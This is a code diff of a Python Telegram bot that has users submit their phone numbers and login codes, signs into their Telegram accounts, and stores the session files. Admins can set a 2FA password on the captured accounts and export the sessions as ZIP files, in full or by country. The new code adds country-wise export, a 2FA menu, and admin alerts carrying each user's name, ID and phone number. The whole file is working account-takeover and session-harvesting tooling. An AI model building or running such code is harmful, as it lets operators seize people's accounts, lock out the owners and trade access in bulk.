@@ -24,71 +24,136 @@ bot = Client(
     bot_token=config.bot_token
 )
 
-# Temporary session data state
 user_sessions = {}
 admin_state = {}
 
-def get_admin_keyboard():
+# KEYBOARDS
+def get_main_admin_keyboard():
     return ReplyKeyboardMarkup(
         [
-            [KeyboardButton("📦 Export All Sessions"), KeyboardButton("🔑 Set 2FA Password")],
-            [KeyboardButton("🌍 Allowed Countries"), KeyboardButton("➕ Add Country")]
+            [KeyboardButton("📦 Import All Sessions"), KeyboardButton("🌍 Country Wise Import")],
+            [KeyboardButton("⚙️ 2FA Management"), KeyboardButton("🌐 Allowed Countries")]
         ],
         resize_keyboard=True
     )
+
+def get_2fa_keyboard():
+    status_icon = "✅" if config.use_2fa else "❌"
+    return ReplyKeyboardMarkup(
+        [
+            [KeyboardButton(f"2FA Status: {status_icon}"), KeyboardButton("🔑 Set 2FA Password")],
+            [KeyboardButton("⬅️ Back to Main Menu")]
+        ],
+        resize_keyboard=True
+    )
+
+def get_country_keyboard():
+    return ReplyKeyboardMarkup(
+        [
+            [KeyboardButton("📋 List Countries"), KeyboardButton("➕ Add Country")],
+            [KeyboardButton("⬅️ Back to Main Menu")]
+        ],
+        resize_keyboard=True
+    )
+
+async def notify_admins_about_error(user, phone_number: str, error_msg: str, stage: str):
+    """ইউজার অ্যাকাউন্ট যুক্ত করতে গিয়ে এরর খেলে অ্যাডমিনকে নোটিফিকেশন পাঠানোর মেথড"""
+    username = f"@{user.username}" if user.username else "No Username"
+    error_text = (
+        "⚠️ **User Account Addition Failed!**\n\n"
+        f"👤 **User:** {user.first_name} {user.last_name or ''}\n"
+        f"🆔 **User ID:** `{user.id}`\n"
+        f"🔗 **Username:** {username}\n"
+        f"📞 **Phone Number:** `{phone_number}`\n"
+        f"📌 **Stage:** `{stage}`\n"
+        f"❌ **Error Details:** `{error_msg}`"
+    )
+    for admin_id in config.admin_ids:
+        try:
+            await bot.send_message(admin_id, error_text)
+        except Exception:
+            pass
 
 @bot.on_message(filters.command("start") & filters.private)
 async def start_handler(client, message: Message):
     user_id = message.from_user.id
     if user_id in config.admin_ids:
-        await message.reply_text(
-            "👑 **Welcome to Admin Control Panel**",
-            reply_markup=get_admin_keyboard()
-        )
+        await message.reply_text("👑 **Admin Control Panel**", reply_markup=get_main_admin_keyboard())
     else:
         await message.reply_text("👋 **Welcome!**\nPlease send your phone number with country code.\nExample: `+8801700000000`")
 
-# --- ADMIN PANEL ACTIONS ---
-
 @bot.on_message(filters.private & filters.text)
-async def handle_all_messages(client, message: Message):
+async def handle_messages(client, message: Message):
     user_id = message.from_user.id
     text = message.text.strip()
+    u = message.from_user
 
-    # Admin Control Flow
+    # --- ADMIN ROUTING ---
     if user_id in config.admin_ids:
-        if text == "📦 Export All Sessions":
-            await export_all_sessions(message)
+        if text == "⬅️ Back to Main Menu":
+            admin_state[user_id] = None
+            await message.reply_text("🔙 Main Menu", reply_markup=get_main_admin_keyboard())
             return
+
+        elif text == "⚙️ 2FA Management":
+            await message.reply_text("⚙️ **2FA Settings Menu**", reply_markup=get_2fa_keyboard())
+            return
+
+        elif text.startswith("2FA Status:"):
+            config.use_2fa = not config.use_2fa
+            status_str = "Enabled ✅" if config.use_2fa else "Disabled ❌"
+            await message.reply_text(f"2FA Protection is now **{status_str}**", reply_markup=get_2fa_keyboard())
+            return
+
         elif text == "🔑 Set 2FA Password":
-            admin_state[user_id] = "AWAITING_2FA"
-            await message.reply_text(f"Current 2FA Password: `{config.custom_2fa_password}`\nSend new 2FA password:")
+            admin_state[user_id] = "SET_2FA"
+            await message.reply_text(f"Current Password: `{config.custom_2fa_password}`\nSend new password:")
             return
-        elif text == "🌍 Allowed Countries":
+
+        elif text == "🌐 Allowed Countries":
+            await message.reply_text("🌐 **Country Management Menu**", reply_markup=get_country_keyboard())
+            return
+
+        elif text == "📋 List Countries":
             await message.reply_text(f"Allowed Countries: `{', '.join(config.allowed_countries)}`")
             return
+
         elif text == "➕ Add Country":
-            admin_state[user_id] = "AWAITING_COUNTRY"
-            await message.reply_text("Send ISO Country Code (e.g., `CL`, `IN`, `US`, `BD`):")
+            admin_state[user_id] = "ADD_COUNTRY"
+            await message.reply_text("Send ISO Country Code (e.g., `CL`, `US`, `BD`):")
             return
 
-        # State check for Admin Inputs
-        if admin_state.get(user_id) == "AWAITING_2FA":
+        elif text == "📦 Import All Sessions":
+            await export_sessions(message, mode="ALL")
+            return
+
+        elif text == "🌍 Country Wise Import":
+            await show_country_stats(message)
+            admin_state[user_id] = "EXPORT_COUNTRY"
+            return
+
+        # STATE INPUT PROCESSING
+        state = admin_state.get(user_id)
+        if state == "SET_2FA":
             config.custom_2fa_password = text
             admin_state[user_id] = None
-            await message.reply_text(f"✅ 2FA Password updated to: `{text}`", reply_markup=get_admin_keyboard())
+            await message.reply_text(f"✅ 2FA Password updated to: `{text}`", reply_markup=get_2fa_keyboard())
             return
-        elif admin_state.get(user_id) == "AWAITING_COUNTRY":
+        elif state == "ADD_COUNTRY":
             c_code = text.upper()
             if c_code not in config.allowed_countries:
                 config.allowed_countries.append(c_code)
             admin_state[user_id] = None
-            await message.reply_text(f"✅ Country `{c_code}` added successfully!", reply_markup=get_admin_keyboard())
+            await message.reply_text(f"✅ Country `{c_code}` Added!", reply_markup=get_country_keyboard())
+            return
+        elif state == "EXPORT_COUNTRY":
+            c_code = text.upper()
+            admin_state[user_id] = None
+            await export_sessions(message, mode="COUNTRY", country_code=c_code)
             return
 
-    # User Phone & OTP Handling
+    # --- USER FLOW & ERROR HANDLING ---
     if text.startswith("+"):
-        # Country Validation Check
         if not config.is_country_allowed(text):
             await message.reply_text("❌ এই কান্ট্রির নম্বর এই বটে গ্রহণযোগ্য নয়।")
             return
@@ -101,49 +166,102 @@ async def handle_all_messages(client, message: Message):
                 "client": res["client"],
                 "hash": res["phone_hash"]
             }
-            await message.reply_text("📩 OTP Code has been sent! Please send the OTP here:")
+            await message.reply_text("📩 OTP Sent! Send code here:")
         except Exception as e:
-            await message.reply_text(f"❌ Error sending OTP: {e}")
+            err_str = str(e)
+            await message.reply_text(f"❌ Error: {err_str}")
+            # Instant Admin Alert on OTP Send Error
+            await notify_admins_about_error(u, text, err_str, "OTP Sending")
             
     elif text.isdigit() and user_id in user_sessions:
-        # OTP Processing
         sess = user_sessions[user_id]
-        await message.reply_text("⚡ Verifying OTP and completing login...")
+        await message.reply_text("⚡ Verifying...")
         
-        res = await tg_engine.complete_login(
-            client=sess["client"],
-            phone_number=sess["phone"],
-            phone_hash=sess["hash"],
-            otp_code=text
-        )
-        
-        if res["status"] == "success":
-            await message.reply_text("✅ Account successfully received!")
-        else:
-            await message.reply_text(f"❌ Login Failed: {res.get('message', 'Unknown Error')}")
+        try:
+            res = await tg_engine.complete_login(
+                client=sess["client"],
+                phone_number=sess["phone"],
+                phone_hash=sess["hash"],
+                otp_code=text
+            )
+            
+            if res["status"] == "success":
+                await message.reply_text("✅ Account successfully received!")
+                
+                # Success Notification to Admin
+                username = f"@{u.username}" if u.username else "No Username"
+                country = res["country"]
+                notify_text = (
+                    "🎉 **New Account Added Successfully!**\n\n"
+                    f"👤 **Adder Name:** {u.first_name} {u.last_name or ''}\n"
+                    f"🆔 **User ID:** `{u.id}`\n"
+                    f"🔗 **Username:** {username}\n"
+                    f"📞 **Phone Number:** `{sess['phone']}`\n"
+                    f"🌍 **Country:** `{country}`\n"
+                    f"🔐 **2FA Status:** `{'Enabled' if config.use_2fa else 'Disabled'}`"
+                )
+                for admin_id in config.admin_ids:
+                    try:
+                        await bot.send_message(admin_id, notify_text)
+                    except Exception:
+                        pass
+            else:
+                err_msg = res.get('message', 'Unknown Error')
+                await message.reply_text(f"❌ Login Failed: {err_msg}")
+                # Instant Admin Alert on Login Failure (e.g., Wrong OTP / Pre-existing 2FA)
+                await notify_admins_about_error(u, sess['phone'], err_msg, "Login Verification")
+
+        except Exception as e:
+            err_str = str(e)
+            await message.reply_text(f"❌ Login Failed: {err_str}")
+            # Instant Admin Alert on Unexpected Exceptions
+            await notify_admins_about_error(u, sess['phone'], err_str, "Login Process Exception")
             
         del user_sessions[user_id]
 
-async def export_all_sessions(message: Message):
-    storage_dir = tg_engine.storage_dir
-    files = os.listdir(storage_dir)
-    
-    if not files:
-        await message.reply_text("📂 No sessions saved in the database yet.")
+async def show_country_stats(message: Message):
+    base_dir = tg_engine.storage_dir
+    if not os.path.exists(base_dir):
+        await message.reply_text("📁 No sessions found.")
         return
 
-    msg = await message.reply_text("📦 Archiving all sessions into a ZIP file...")
-    zip_path = "all_sessions_export.zip"
-    
-    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
-        for root, _, filenames in os.walk(storage_dir):
-            for filename in filenames:
-                full_path = os.path.join(root, filename)
-                zipf.write(full_path, filename)
-                
-    await message.reply_document(document=zip_path, caption=f"✅ Total exported files: {len(files)}")
-    os.remove(zip_path)
+    text = "📊 **Available Sessions by Country:**\n\n"
+    found = False
+    for item in os.listdir(base_dir):
+        item_path = os.path.join(base_dir, item)
+        if os.path.isdir(item_path):
+            count = len([f for f in os.listdir(item_path) if f.endswith(".session")])
+            text += f"🏁 **Country `{item}`**: `{count}` accounts\n"
+            found = True
+            
+    if not found:
+        text = "📂 Database is empty."
+    else:
+        text += "\n👇 **Type/Send the Country Code (e.g., CL, BD, US) to export:**"
+        
+    await message.reply_text(text)
+
+async def export_sessions(message: Message, mode="ALL", country_code=None):
+    base_dir = tg_engine.storage_dir
+    target_dir = base_dir if mode == "ALL" else os.path.join(base_dir, country_code or "")
+
+    if not os.path.exists(target_dir) or not os.listdir(target_dir):
+        await message.reply_text("❌ No sessions found to export.", reply_markup=get_main_admin_keyboard())
+        return
+
+    msg = await message.reply_text("📦 Creating ZIP...")
+    zip_name = f"sessions_{country_code or 'ALL'}.zip"
+
+    with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as zipf:
+        for root, _, files in os.walk(target_dir):
+            for file in files:
+                full_path = os.path.join(root, file)
+                arcname = os.path.relpath(full_path, base_dir)
+                zipf.write(full_path, arcname)
+
+    await message.reply_document(document=zip_name, caption=f"✅ Exported Mode: `{mode}` | Code: `{country_code or 'ALL'}`")
+    os.remove(zip_name)
     await msg.delete()
 
-print("🤖 Upgraded Bot is starting...")
+print("🤖 Upgraded Admin Panel Bot Running...")
 bot.run()
